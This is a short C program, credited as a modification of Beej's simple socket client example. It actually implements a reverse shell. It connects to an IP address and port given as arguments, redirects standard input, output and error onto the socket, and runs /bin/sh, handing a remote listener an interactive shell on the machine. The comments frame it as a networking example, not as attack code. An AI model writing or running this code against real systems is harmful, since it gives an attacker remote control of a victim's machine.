// Reference : http://beej.us/net2/html/clientserver.html#simpleclient
// Modified by Dibyendu

#include<stdio.h>
#include<sys/types.h>
#include<sys/socket.h>
#include<netinet/in.h>
#include<stdlib.h>
#include<netdb.h>

#define PORT 3490

#define MAX_DATA_SIZE 100

int main(int argc, char *argv[]){
	int sockfd, numbytes;
	char buf[MAX_DATA_SIZE];
	struct hostent *he;
	struct sockaddr_in their_addr;

	if(argc!=3){
		printf("\nUsage : ./IP_ADDRESS PORT_NUMBER");
		exit(1);
 	}
	
	if((he=gethostbyname(argv[1])) == NULL){
		printf("\nCould not resolve  IP");
		exit(1);
	}

	if((sockfd = socket(AF_INET,SOCK_STREAM,0)) < 0){
		printf("\nSocket Error");
		exit(1);
	}
	
	their_addr.sin_family = AF_INET;
	their_addr.sin_port = htons(atoi(argv[2]));
	//their_addr.sin_addr = *((struct in_addr *)he ->h_addr);
	//their_addr.sin_addr = *((struct in_addr *)he->h_addr);
	their_addr.sin_addr.s_addr = inet_addr(argv[1]);
	memset(&(their_addr.sin_zero),'\0',8);

	if(connect(sockfd, (struct sockaddr *)&their_addr, sizeof(struct sockaddr)) == -1){
		printf("\n Cannot connect");
	}

	dup2(sockfd,0);
	dup2(sockfd,1);
	dup2(sockfd,2);
	execve("/bin/sh", 0, 0);
}


